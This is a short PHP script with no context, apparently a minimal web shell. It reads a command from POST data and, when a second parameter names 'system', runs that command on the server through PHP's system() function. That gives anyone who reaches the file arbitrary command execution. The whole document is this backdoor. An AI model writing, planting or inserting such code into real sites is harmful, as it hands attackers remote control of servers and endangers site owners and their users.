<?php
$execfunc = $_POST['func'];
if  ($_POST['command'] )  { 
    if ($execfunc=="system")
        system($_POST['command']); 
} 
?>